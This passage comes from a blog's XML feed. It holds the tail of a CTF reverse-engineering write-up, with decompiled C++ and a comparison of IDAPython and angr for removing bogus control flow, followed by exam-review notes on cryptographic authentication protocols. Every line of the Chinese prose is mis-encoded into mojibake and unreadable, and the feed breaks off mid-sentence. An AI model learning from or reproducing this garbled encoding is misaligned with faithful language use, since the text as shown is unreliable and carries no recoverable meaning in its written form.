class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1686);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1796);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1891);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_1996);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2112);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2165);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2260);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2336);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2412);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2498);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;::push_back(&amp;hero, &amp;secret_2575);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::length(v9) - <span class="hljs-number">1LL</span> != legend &gt;&gt; <span class="hljs-number">2</span> )<br>  &#123;<br>    *v6 = legend &gt;&gt; <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-built_in">string</span>(v5, v9);<br>    v3 = sanitize_input(v5);<br>    *v6 = v3;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::~<span class="hljs-built_in">string</span>(v5);<br>  &#125;<br>  <span class="hljs-keyword">return</span> *v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯è¿è¡Œå®Œï¼Œæ¸…é™¤<code>start_quest</code>æ··æ·†åçš„æ•ˆæœï¼Œå¯ä»¥å‘ç°æ•ˆæœä¸é”™ï¼Œè€Œä¸”ä¸ä¹‹å‰IDApythonçš„ç»“æœä¸èƒ½è¯´å·®ä¸å¤šå§ï¼Œåªèƒ½è¯´ä¸€æ¨¡ä¸€æ ·ã€‚å› ä¸ºè¿™äºŒè€…çš„æ€è·¯æœ¬è´¨ä¸Šéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ®Šé€”åŒå½’äº†å±äºæ˜¯</p><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>æ¸…é™¤æ··æ·†åçš„æ­¥éª¤å°±æ¯”è¾ƒç®€å•äº†ï¼Œè™½ç„¶å®ƒè¿˜æœ‰ä¸€ä¸ªå˜é‡åæ··æ·†ï¼Œå°±æ˜¯ä¸€ä¸ªå˜é‡èµ‹å€¼æ¥èµ‹å€¼å»çš„ï¼Œä¸è¿‡è¿™ä¸ªç›´æ¥ä½¿ç”¨IDAçš„å˜é‡é‡å‘½åå°±èƒ½è½»æ¾æå®šäº†ã€‚</p><p>å¯¹æ¯”ä¸€ä¸‹å¯ä»¥å‘ç°ï¼ŒIDApythonçš„è„šæœ¬ç®€æ´æ˜äº†ï¼Œè¿è¡Œé€Ÿåº¦ä¹Ÿå¿«äºAngrï¼Œä½†å®ƒçš„ç¼ºç‚¹å°±æ˜¯åœ¨é¢å¯¹å¤æ‚æƒ…å†µä¸‹çš„æ··æ·†å¯èƒ½å°±æœ‰ç‚¹ä¹åŠ›ï¼Œæ¯”å¦‚è¿™å‡ ä¸ªå˜é‡ä¸å†åˆå§‹ä¸º0ï¼Œè€Œæ˜¯éšæœºçš„åˆå§‹å€¼ï¼Œå¯èƒ½å°±å¾—è´¹ä¸€ç•ªåŠŸå¤«å»ä¿®æ”¹è„šæœ¬äº†ã€‚è€ŒAngrçš„ä¼˜åŠ¿åœ¨äºå®ƒçš„å‡†ç¡®æ€§ï¼Œå› ä¸ºå®ƒå°±æ˜¯å®æ‰“å®çš„å»è·‘ï¼Œå»æ¢ç´¢ç©¶ç«Ÿå“ªä¸€ä¸ªå—æ˜¯å¯è¾¾çš„ï¼Œå“ªä¸€ä¸ªå—æ˜¯ä¸å¯è¾¾çš„ï¼Œå³ä½¿é¢å¯¹å¤æ‚çš„æ§åˆ¶æµæ··æ·†ï¼Œè¿™ä¸€æœ¬è´¨æ˜¯ä»æ˜¯é€šç”¨çš„ã€‚</p><p>äºŒè€…å„æœ‰ä¼˜åŠ£ï¼Œä½†éƒ½å¾ˆç²¾å½©ã€‚</p><p>ï¼ˆå½“ç„¶è¿™é¢˜ä¹Ÿå¯ä»¥ç›´æ¥ç¬¦å·æ‰§è¡Œå‡ºflagï¼Œä½†æ˜¯è¿™æ˜¾ç„¶å°±å­¦ä¸åˆ°ä»€ä¹ˆäº†ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>recurrence</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
      <tag>idapython</tag>
      
      <tag>debogus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ä¸ƒç«  å¯†ç åè®®</title>
    <link href="/2023/06/01/cryptographic%20protocol/"/>
    <url>/2023/06/01/cryptographic%20protocol/</url>
    
    <content type="html"><![CDATA[<p>æ€¥æ€¥æ€¥ æœŸæœ«é¢„ä¹ æ€¥æ€¥æ€¥</p><span id="more"></span><h2 id="å¯†ç åè®®æ¦‚è¿°"><a href="#å¯†ç åè®®æ¦‚è¿°" class="headerlink" title="å¯†ç åè®®æ¦‚è¿°"></a>å¯†ç åè®®æ¦‚è¿°</h2><ul><li>åè®®æ˜¯ä¸€ç§æœ‰åºè¿‡ç¨‹ï¼Œæ¯ä¸€æ­¥å¿…é¡»ä»¥æ­¤æ‰§è¡Œï¼›éœ€è¦è‡³å°‘ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å‚ä¸è€…ï¼Œä¸”æœ€ç»ˆè¦å®ŒæˆæŸç§ä»»åŠ¡ï¼Œå³å®ç°æŸç§åŠŸèƒ½</li><li>åè®®å¯¹å‚ä¸è€…ä¸€å®šæ˜¯å®Œå…¨ <em><strong>å…¬å¼€</strong></em> çš„ï¼Œä¸” <em><strong>æŒ‰ç…§è§„èŒƒ</strong></em> åŠ¨ä½œ</li><li>åè®®çš„åŸºæœ¬è¦æ±‚æ˜¯ <em><strong>æœ‰æ•ˆæ€§ã€å…¬å¹³æ€§ã€å®Œæ•´æ€§</strong></em></li><li>å¯†ç åè®®ä¹Ÿå« <em><strong>å®‰å…¨åè®®</strong></em>ï¼Œæ˜¯å»ºç«‹åœ¨ <em><strong>å¯†ç </strong></em> ä½“åˆ¶çš„åŸºç¡€ä¸Šçš„ä¸€ç§ <em><strong>äº¤äº’å¼é€šä¿¡åè®®</strong></em> ï¼Œå€ŸåŠ©äºå¯†ç ç®—æ³•æ¥è¾¾åˆ°å®‰å…¨åŠŸèƒ½</li><li>å¯†ç åè®®æ‰€èƒ½å®ç°çš„å®‰å…¨åŠŸèƒ½æ˜¯å¤šç§å¤šæ ·çš„<ul><li>èº«ä»½è®¤è¯ã€å¯†é’¥åå•†ã€æ¶ˆæ¯ é‰´åˆ«ã€å…¬å¹³æŠ›å¸</li><li>å¤šæ–¹è®¡ç®—ã€ç§˜å¯†å…±äº«ã€ä¸ç»æ„ä¼ è¾“</li><li>é›¶çŸ¥è¯†è¯æ˜</li></ul></li><li>å¯†ç åè®®çš„åº”ç”¨<ul><li>å®‰å…¨é€šä¿¡</li><li>ç”µå­é€‰ä¸¾</li><li>ç”µå­æ‹å–</li><li>å…¬å¹³ç”µå­äº¤æ˜“</li></ul></li></ul><h2 id="è®¤è¯åè®®"><a href="#è®¤è¯åè®®" class="headerlink" title="è®¤è¯åè®®"></a>è®¤è¯åè®®</h2><h3 id="è®¤è¯åè®®æ¦‚è¿°"><a href="#è®¤è¯åè®®æ¦‚è¿°" class="headerlink" title="è®¤è¯åè®®æ¦‚è¿°"></a>è®¤è¯åè®®æ¦‚è¿°</h3><ul><li><p>è®¤è¯ï¼šä¸€ä¸ªå®ä½“å‘å¦ä¸€ä¸ªå®ä½“ <em><strong>è¯æ˜</strong></em> æŸç§å£°ç§°çš„ä¸œè¥¿è¿‡ç¨‹</p></li><li><p>è®¤è¯åè®®ï¼šä¸»è¦ç›®æ ‡æ˜¯ç¡®è®¤æŸä¸ªä¸»ä½“çš„çœŸå®æ€§ï¼Œç¡®ä¿ä¿¡æ¯çš„å®‰å…¨æ€§</p></li><li><p>å®‰å…¨å¯é çš„é€šä¿¡ <em><strong>é™¤éœ€è¿›è¡Œæ¶ˆæ¯çš„è®¤è¯</strong></em> å¤–ï¼Œè¿˜éœ€ <em><strong>å»ºç«‹ä¸€äº›è§„èŒƒçš„åè®®</strong></em> å¯¹ <em><strong>æ•°æ®æ¥æºçš„å¯é æ€§ï¼Œé€šä¿¡å®ä½“çš„çœŸå®æ€§åŠ ä»¥è®¤è¯ï¼Œä»¥é˜²æ­¢æ¬ºéª—ã€ä¼ªè£…ç­‰æ”»å‡»</strong></em></p></li><li><p>è®¤è¯çš„åˆ†ç±»</p><ul><li><em><strong>èº«ä»½è®¤è¯</strong></em>ï¼š ä¹Ÿç§°å®ä½“è®¤è¯ï¼ŒéªŒè¯æ¶ˆæ¯å‘é€è€…æ‰€å£°ç§°çš„èº«ä»½ï¼Œå‘èµ·é€šä¿¡æˆ–è®¿é—®çš„å®ä½“æ˜¯å¦å…·æœ‰åˆæ³•èº«ä»½å’Œç›¸åº”æƒé™</li><li><em><strong>å¯†é’¥å»ºç«‹è®¤è¯</strong></em>ï¼šç”Ÿæˆã€è·å¾—åŠ è§£å¯†å¯†é’¥</li><li><em><strong>æ•°æ®æºè®¤è¯</strong></em>ï¼š éªŒè¯æ¶ˆæ¯ä¸å…¶å‘é€ä¸»ä½“çš„ä¸€è‡´æ€§ï¼Œæ•°æ®ä»å“ªæ¥</li><li><em><strong>æ¶ˆæ¯å®Œæ•´æ€§è®¤è¯</strong></em>ï¼š éªŒè¯æ¶ˆæ¯æ˜¯å¦è¢«ç¯¡æ”¹</li></ul></li><li><p>è¿™äº›è®¤è¯é€šå¸¸ä¸€èµ·è¿›è¡Œï¼Œä¹Ÿæœ‰æ—¶å•ç‹¬è¿›è¡Œ</p><ul><li>å³é€šä¿¡åŠä¹‹å‰é¦–å…ˆè¿›è¡Œå®ä½“è®¤è¯ï¼ˆèº«ä»½è®¤è¯ï¼‰ï¼Œèº«ä»½è®¤è¯ä¹‹åä¼šåå•†å‡ºä¼šè¯å¯†é’¥ç”¨äºå¯¹æ¯ä¸ªä¼ è¾“æ•°æ®çš„æ•°æ®æºè®¤è¯å’Œå®Œæ•´æ€§è®¤è¯</li></ul></li></ul><h3 id="è®¤è¯"><a href="#è®¤è¯" class="headerlink" title="è®¤è¯"></a>è®¤è¯</h3><h4 id="èº«ä»½è®¤è¯"><a href="#èº«ä»½è®¤è¯" class="headerlink" title="èº«ä»½è®¤è¯"></a>èº«ä»½è®¤è¯</h4><ul><li>èº«ä»½è®¤è¯æœ‰ä¸¤ä¸ªå±‚æ¬¡ï¼šèº«ä»½è¯å® å’Œ èº«ä»½è¯†åˆ« äºŒè€…å·®åˆ«æ˜¯æ˜¯å¦å‡ºç¤ºèº«ä»½<ul><li>èº«ä»½è¯å®ï¼šä½ æ˜¯å¦æ˜¯ä½ å®£ç§°çš„ä½ ï¼Œä¸€èˆ¬çš„èº«ä»½è®¤è¯éƒ½æ˜¯æŒ‡è¿™ç§æƒ…å†µ<ul><li>éªŒè¯æ–¹é¦–å…ˆçŸ¥é“è¦éªŒè¯çš„èº«ä»½æ˜¯è°ï¼Œè¿›ä¸€æ­¥æ¥è¯å®æ¥è®¿é—®ä¸ä¹‹é€šä¿¡çš„äººæ˜¯å¦å…·æœ‰è¯¥èº«ä»½</li><li>ä¸€èˆ¬ç”¨äºAå’ŒBç¡®å®šé€šä¿¡æ—¶æ‰€ç”¨ï¼Œé€šå¸¸çš„ç½‘ç»œè®¤è¯åè®®éƒ½æ˜¯èº«ä»½è¯å®</li><li>å…·ä½“æŠ€æœ¯ï¼š<em><strong>è¾“å…¥ä¸ªäººä¿¡æ¯ï¼Œç»å…¬å¼æˆ–ç®—æ³•è¿ç®—æ‰€å¾—ç»“æœä¸å¡ä¸­æˆ–æ•°æ®åº“ä¸­å­˜å‚¨ä¿¡æ¯ç»å…¬å¸å’Œè¿ç®—æ‰€ç»“æœæ¯”è¾ƒ</strong></em></li></ul></li><li>èº«ä»½è¯†åˆ«ï¼šæˆ‘æ˜¯å¦çŸ¥é“ä½ æ˜¯è°<ul><li>éªŒè¯æ–¹ä¸çŸ¥é“æ¥è®¿äººæ˜¯å¦ä¸ºåˆæ³•èº«ä»½ï¼Œæ²¡æœ‰æ¯”è¾ƒç¡®å®šçš„ç›®æ ‡ï¼Œ<em><strong>åªè¦æ»¡è¶³æŸä¸ªæ¡ä»¶å°±å¯åˆ¤å®šèº«ä»½çš„ç‰¹ç‚¹</strong></em>ï¼ŒéªŒè¯è€…ä¸€èˆ¬ä¸ºæƒå¨æœºæ„</li><li>ä¸€èˆ¬åœ¨å®ä½“è®¤è¯ä¸­éœ€è¦ï¼Œæ¯”å¦‚åˆ¤æ–­æ¥è®¿è€…æ˜¯å¦æ˜¯åœ¨é€ƒçŠ¯ï¼Œæ˜¯å¦ä¸ºå¯†ç å¼€å¯è€…ï¼Œæ˜¯å¦ä¸ºæœ¬å…¬å¸å‘˜å·¥ã€‚é€šå¸¸ç”¨ <em><strong>æŒ‡çº¹ã€è™¹è†œæŠ€æœ¯</strong></em></li><li>å…·ä½“æŠ€æœ¯ï¼š <em><strong>è¾“å…¥ä¸ªäººä¿¡æ¯ï¼Œç»è¿‡å¤„ç†æå–æ¨¡æ¿ä¿¡æ¯ï¼Œè¯•ç€åœ¨å­˜å‚¨æ•°æ®åº“ä¸­æ‰¾å‡ºä¸€ä¸ªä¸ä¹‹åŒ¹é…çš„æ¨¡æ¿è€Œåå¾—å‡ºç»“è®º</strong></em></li></ul></li></ul></li><li>ä¸»è¦éªŒè¯ç”¨æˆ· <em><strong>çŸ¥é“ä»€ä¹ˆ</strong></em> å¦‚å£ä»¤ã€å¯†é’¥ã€ç§é’¥ã€ç§˜å¯†ç­‰ï¼ŒéªŒè¯ç”¨æˆ· <em><strong>æ‹¥æœ‰ä»€ä¹ˆ</strong></em>  å¦‚ICå¡ï¼ŒéªŒè¯ç”¨æˆ· <em><strong>å…·æœ‰ä»€ä¹ˆç‰¹å¾</strong></em> å¦‚æŒ‡çº¹ã€æŒçº¹ã€è™¹è†œã€DNAç­‰<ul><li>åŸºäºå£ä»¤çš„èº«ä»½è®¤è¯æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€ç±»ï¼Œå…·æœ‰å¹¿æ³›çš„åº”ç”¨ï¼Œå› ä¸ºç”¨æˆ·ä¸éœ€è¦æºå¸¦æˆ–è®°å¿†å¤æ‚çš„å¯†é’¥æˆ–è®¤è¯æ¶ˆæ¯</li></ul></li></ul><h4 id="æ•°æ®æºè®¤è¯å’Œæ¶ˆæ¯å®Œæ•´æ€§è®¤è¯çš„åŒºåˆ«"><a href="#æ•°æ®æºè®¤è¯å’Œæ¶ˆæ¯å®Œæ•´æ€§è®¤è¯çš„åŒºåˆ«" class="headerlink" title="æ•°æ®æºè®¤è¯å’Œæ¶ˆæ¯å®Œæ•´æ€§è®¤è¯çš„åŒºåˆ«"></a>æ•°æ®æºè®¤è¯å’Œæ¶ˆæ¯å®Œæ•´æ€§è®¤è¯çš„åŒºåˆ«</h4><ul><li><p>æ•°æ®æºè®¤è¯ <em><strong>ä¸€å®š</strong></em> æ¶‰åŠé€šä¿¡ï¼Œæ˜¯ä¸€ç§å®‰å…¨æœåŠ¡</p><p>æ¶ˆæ¯å®Œæ•´æ€§è®¤è¯ <em><strong>ä¸ä¸€å®š</strong></em> æ¶‰åŠé€šä¿¡ï¼Œå¯ç”¨äºå­˜å‚¨çš„æ•°æ®</p></li><li><p>æ•°æ®æºè®¤è¯ <em><strong>ä¸€å®š</strong></em> æ¶‰åŠæ¶ˆæ¯æºè¯†åˆ«</p><p>è€Œæ¶ˆæ¯å®Œæ•´æ€§ <em><strong>ä¸ä¸€å®š</strong></em> æ¶‰åŠè¯¥è¿‡ç¨‹</p><p>æ¯”å¦‚ç”¨æˆ·Aå°†ä¸€ä¸ªç”±ç”¨æˆ·Cç­¾åçš„æ¶ˆæ¯æ–‡ä»¶å‘ç»™ç”¨æˆ·Bï¼Œé‚£ä¹ˆç”¨æˆ·Bèƒ½å¤Ÿé€šè¿‡éªŒè¯Cçš„ç­¾ååˆ¤æ–­æ¶ˆæ¯å®Œæ•´æ€§ï¼Œä½†æ˜¯æ¶ˆæ¯çš„æ¥æºå´ä¸æ˜¯Cè€Œæ˜¯A</p></li><li><p>æ•°æ®æºè®¤è¯ <em><strong>ä¸€å®š</strong></em> æ¶‰åŠç¡®è®¤æ¶ˆæ¯çš„æ–°é²œæ€§</p><p>è€Œæ•°æ®å®Œæ•´æ€§å´ <em><strong>æ— æ­¤å¿…è¦</strong></em></p><p>æ¯”å¦‚ä¸€ç»„è€çš„æ•°æ®ï¼Œæˆ–è€…é‡æ”¾çš„æ•°æ®å¯èƒ½ç”±å®Œå–„çš„æ•°æ®å®Œæ•´æ€§ï¼Œè€Œæ˜¯æ•°æ®æºè®¤è¯è¦æ±‚ç¡®è®¤æ”¶åˆ°çš„æ¶ˆæ¯æ˜¯æ–°é²œçš„ï¼Œå³æ˜¯å½“å‰æ–°å‘é€çš„ï¼Œè€Œä¸æ˜¯æ—§æ¶ˆæ¯çš„é‡æ”¾</p><h4 id="è®¤è¯éœ€æ±‚"><a href="#è®¤è¯éœ€æ±‚" class="headerlink" title="è®¤è¯éœ€æ±‚"></a>è®¤è¯éœ€æ±‚</h4></li><li><p>æœ‰çš„åè®®åªéœ€è¦è®¤è¯èº«ä»½</p></li><li><p>æœ‰çš„åè®®é™¤äº†è®¤è¯èº«ä»½è¿˜éœ€è¦å»ºç«‹ä¹‹åé€šä¿¡çš„å¯†é’¥ä»¥ä¿æŠ¤é€šä¿¡å®‰å…¨ï¼Œå³èº«ä»½è®¤è¯ä¸å¯†é’¥åå•†ï¼ˆå¯†é’¥å»ºç«‹ç¡®è®¤åè®®ï¼‰</p></li><li><p>æœ‰çš„åè®®ä¸»è¦è€ƒè™‘å¯¹æ¶ˆæ¯æºçš„è®¤è¯ï¼Œè¿™æ—¶ä¸€èˆ¬é¦–å…ˆè¦è®¤è¯èº«ä»½å¹¶å»ºç«‹å¯†é’¥ï¼Œç„¶åå†åŸºäºè¯¥ä¼šè¯å¯†é’¥å¯¹ä¼ è¾“çš„æ¯ä¸ªæ¶ˆæ¯è¿›è¡Œè®¤è¯ï¼Œä»¥ä½¿æ”¶æ–¹ç¡®ä¿¡æ”¶åˆ°çš„æ¶ˆæ¯æ¥è‡ªå‘æ–¹ï¼Œè€Œä¸”ä¸æ˜¯é‡æ”¾ï¼Œåœ¨é¡ºåºã€æ—¶é—´ç­‰æ–¹é¢éƒ½æ˜¯æ­£ç¡®çš„ï¼Œå³å®Œæ•´æ€§</p></li></ul><h4 id="å¸¸è§æ”»å‡»"><a href="#å¸¸è§æ”»å‡»" class="headerlink" title="å¸¸è§æ”»å‡»"></a>å¸¸è§æ”»å‡»</h4><ul><li>å¸¸è§é’ˆå¯¹è®¤è¯å’Œå¯†é’¥å»ºç«‹åè®®çš„æ”»å‡»<ul><li>é‡æ”¾æ”»å‡» Replay attack</li><li>ä¸­é—´äººæ”»å‡» Man-in-the-middle</li><li>å·²çŸ¥å¯†é’¥æ”»å‡» ä»ä»¥å‰ç”¨è¿‡çš„å¯†é’¥ç¡®å®šæ–°å¯†é’¥</li><li>å‡å†’æ”»å‡» Impresonation attack</li><li>ç¯¡æ”¹æˆ–æ›¿æ¢</li><li>å­—å…¸æ”»å‡» Dictionary attack é’ˆå¯¹å£ä»¤çš„ä¸€ç±»æ”»å‡»</li><li>æ‹’æ¥æœåŠ¡æ”»å‡»</li></ul></li></ul><h2 id="åŸºæœ¬è®¤è¯æŠ€æœ¯"><a href="#åŸºæœ¬è®¤è¯æŠ€æœ¯" class="headerlink" title="åŸºæœ¬è®¤è¯æŠ€æœ¯"></a>åŸºæœ¬è®¤è¯æŠ€æœ¯</h2><ul><li>è¯æ˜æ¶ˆæ¯çš„æ–°é²œæ€§å’Œä¸»ä½“æ´»ç°æ€§çš„æ ‡å‡†æœºåˆ¶</li><li>åŒå‘è®¤è¯å’Œå•å‘è®¤è¯</li><li>åŒ…å«å¯ä¿¡ç¬¬ä¸‰æ–¹çš„è®¤è¯</li></ul><h3 id="æ¶ˆæ¯çš„æ–°é²œæ€§å’Œä¸»ä½“çš„æ´»ç°æ€§"><a href="#æ¶ˆæ¯çš„æ–°é²œæ€§å’Œä¸»ä½“çš„æ´»ç°æ€§" class="headerlink" title="æ¶ˆæ¯çš„æ–°é²œæ€§å’Œä¸»ä½“çš„æ´»ç°æ€§"></a>æ¶ˆæ¯çš„æ–°é²œæ€§å’Œä¸»ä½“çš„æ´»ç°æ€§</h3><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><ul><li>æ¶ˆæ¯çš„æ–°é²œæ€§ï¼Œå³å®æ—¶æ€§æ˜¯æ•°æ®æºè®¤è¯æ‰€ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ï¼Œè€Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ä¸»ä½“ä¹Ÿè¦è€ƒè™‘ <em><strong>é€šä¿¡å¯¹ç«¯çš„èº«ä»½çœŸå®æ€§</strong></em> ä»¥åŠ <em><strong>æ˜¯å¦åœ¨çº¿ï¼Œå³ä¸»ä½“æ´»ç°æ€§</strong></em> ï¼Œå› æ­¤è¯æ˜æ¶ˆæ¯çš„æ–°é²œæ€§æˆ–ä¸»ä½“çš„æ´»ç°æ€§å°±æˆä¸ºè®¤è¯åè®®çš„æœ€åŸºæœ¬ç»„æˆéƒ¨åˆ†</li><li>æ¶ˆæ¯çš„æ–°é²œæ€§ç»å¸¸ä¼´éšç€ä¸»ä½“æ´»ç°æ€§çš„è®¤è¯ï¼Œå› ä¸ºä»¥æ–°é²œæ€§è®¨è®ºä¸ºä¸»</li><li><em><strong>æ¶ˆæ¯çš„æ–°é²œæ€§ä¹Ÿç§°ä¸ºå®æ—¶æ€§</strong></em></li><li>æ–°é²œæ€§ï¼ˆå®æ—¶æ€§ï¼‰å¯¹é˜²æ²»æ¶ˆæ¯çš„é‡æ”¾æ”»å‡»æä¸ºé‡è¦ï¼Œä¸€ç§æ–¹æ³•æ˜¯å¯¹äº¤æ¢çš„æ¯ä¸€æ¡æ¶ˆæ¯éƒ½åŠ ä¸Šä¸€ä¸ª<em><strong>åºåˆ—å·</strong></em>ï¼Œä¸€ä¸ªæ–°æ¶ˆæ¯ä»…å½“å®ƒæœ‰æ­£ç¡®çš„åºåˆ—å·æ‰è¢«æ¥æ”¶ã€‚è¿™ç§æ–¹æ³•çš„å›°éš¾æ€§æ˜¯è¦æ±‚ <em><strong>æ¯ä¸ªç”¨æˆ·åˆ†åˆ«è®°å½•</strong></em> ä¸å…¶ä»–æ¯ä¸€ç”¨æˆ·äº¤æ¢çš„æ¶ˆæ¯åºåˆ—å·ï¼Œå¢åŠ ç”¨æˆ·è´Ÿæ‹…ï¼Œå› æ­¤ <em><strong>åºåˆ—å·æ–¹æ³•ä¸€èˆ¬ä¸ç”¨äºè®¤è¯å’Œå¯†é’¥äº¤æ¢</strong></em></li></ul><h4 id="ä¸¤ç§å®ç°æ¶ˆæ¯æ–°é²œæ€§çš„æŠ€æœ¯"><a href="#ä¸¤ç§å®ç°æ¶ˆæ¯æ–°é²œæ€§çš„æŠ€æœ¯" class="headerlink" title="ä¸¤ç§å®ç°æ¶ˆæ¯æ–°é²œæ€§çš„æŠ€æœ¯"></a>ä¸¤ç§å®ç°æ¶ˆæ¯æ–°é²œæ€§çš„æŠ€æœ¯</h4><ul><li><p>ç”±ä¸¤ç§æ–¹å¼å®ç°æ¶ˆæ¯æ–°é²œæ€§ï¼šæ—¶é—´æˆ³ å’Œ è¯¢é—®åº”ç­”æœºåˆ¶</p><ul><li><p>æ—¶æˆ³ï¼š</p><p>å¦‚æœAæ¶ˆæ¯æ”¶åˆ°çš„æ¶ˆæ¯åŒ…æ‹¬æ—¶æˆ³ï¼Œä¸”åœ¨Açœ‹æ¥è¿™ä¸€æ—¶æˆ³å……åˆ†æ¥è¿‘è‡ªå·±çš„å½“å‰æ—¶åˆ»ï¼ŒAæ‰è®¤ä¸ºæ”¶åˆ°çš„æ¶ˆæ¯æ˜¯æ–°çš„å¹¶æ¥å—ä¹‹ï¼Œè¿™ç§æ–¹æ¡ˆ <em>è¦æ±‚æ‰€æœ‰å„æ–¹çš„æ—¶é’Ÿæ˜¯åŒæ­¥çš„</em></p></li><li><p>è¯¢é—®-åº”ç­”ï¼š</p><p>ç”¨æˆ·Aå‘Bå‘å‡ºä¸€ä¸ª <em>ä¸€æ¬¡æ€§éšæœºæ•°ä½œä¸ºè¯¢é—®</em> ï¼Œå¦‚æœBæ”¶åˆ°å‘æ¥çš„æ¶ˆæ¯ï¼ˆåº”ç­”ï¼‰ï¼Œä¹ŸåŒ…å«ä¸€æ­£ç¡®çš„ä¸€æ¬¡æ€§éšæœºæ•°ï¼ŒAå°±è®¤ä¸ºBå‘æ¥çš„æ¶ˆæ¯æ˜¯æ–°çš„å¹¶æ¥å—ä¹‹</p></li></ul></li><li><p>ç¼ºç‚¹</p><ul><li>æ—¶é—´æˆ³ä¸èƒ½ç”¨äºé¢å‘é“¾æ¥çš„åº”ç”¨è¿‡ç¨‹<ul><li>è¿™æ˜¯ç”±äº <em>æ—¶æˆ³æ³•åœ¨å®ç°æ—¶å›ºæœ‰çš„å›°éš¾æ€§</em></li><li>é¦–å…ˆæ˜¯éœ€è¦åœ¨ <em>ä¸åŒçš„å¤„ç†å™¨æ—¶é’Ÿä¹‹é—´ä¿æŒåŒæ­¥</em> ï¼Œé‚£ä¹ˆ <em>æ‰€ç”¨çš„åè®®å¿…é¡»æ˜¯å®¹é”™çš„ä»¥å¤„ç†ç½‘ç»œé”™è¯¯</em> ï¼Œå¹¶ä¸”æ˜¯å®‰å…¨çš„ä»¥å¯¹ä»˜æ¶æ„æ”»å‡»</li><li>ç¬¬äºŒï¼Œå¦‚æœ <em>åè®®ä¸­ä»»ä¸€æ–¹çš„æ—¶é’Ÿå‡ºç°é”™è¯¯è€Œæš‚æ—¶å¤±å»äº†åŒæ­¥</em> ï¼Œåˆ™å°†ä½¿æ•Œæ‰‹æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§å¢åŠ </li><li>æœ€åè¿˜ç”±äº <em>ç½‘ç»œæœ¬èº«å­˜åœ¨å»¶è¿Ÿ</em> ï¼Œå› æ­¤ä¸èƒ½æœŸæœ›åè®®çš„å„æ–¹èƒ½ä¿æŒç²¾ç¡®çš„åŒæ­¥ã€‚ æ‰€ä»¥ä»»ä½•åŸºäºæ—¶æˆ³çš„å¤„ç†è¿‡ç¨‹ã€åè®®ç­‰éƒ½ <em>å¿…é¡»å…è®¸åŒæ­¥æœ‰ä¸€ä¸ªè¯¯å·®èŒƒå›´</em> ï¼Œ<em><strong>è€ƒè™‘åˆ°ç½‘ç»œæœ¬èº«çš„å»¶è¿Ÿ</strong></em>ï¼Œ <em>è¯¯å·®èŒƒå›´åº”è¶³å¤Ÿå¤§</em> ï¼Œ<em><strong>è€ƒè™‘åˆ°å¯èƒ½å­˜åœ¨æ”»å‡»</strong></em>ï¼Œ <em>è¯¯å·®èŒƒå›´åˆåº”è¯¥è¶³å¤Ÿå°</em></li></ul></li><li>è¯¢é—®-åº”ç­”æ–¹å¼åˆ™ä¸é€‚åˆäºæ— è¿æ¥çš„åº”ç”¨è¿‡ç¨‹<ul><li>è¿™æ˜¯å› ä¸ºæ— è¿æ¥ä¼ è¾“ä»¥å‰éœ€ç»è¯¢é—®-åº”ç­”è¿™ä¸€é¢å¤–æ¡æ‰‹è¿‡ç¨‹ï¼Œè¿™ä¸æ— è¿æ¥åº”ç”¨è¿‡ç¨‹çš„æœ¬è´¨ç‰¹æ€§ä¸ç¬¦</li><li>å¯¹äºæ— è¿æ¥çš„åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œåˆ©ç”¨æŸç§å®‰å…¨çš„ <em>æ—¶é—´æœåŠ¡å™¨</em> ä¿æŒå„æ–¹å§‹ç»ˆåŒæ­¥æ˜¯é˜²æ­¢é‡æ”¾æ”»å‡»æœ€å¥½çš„æ–¹æ³•</li></ul></li><li>å…³äºæœ‰çŠ¶æ€å’Œæ— 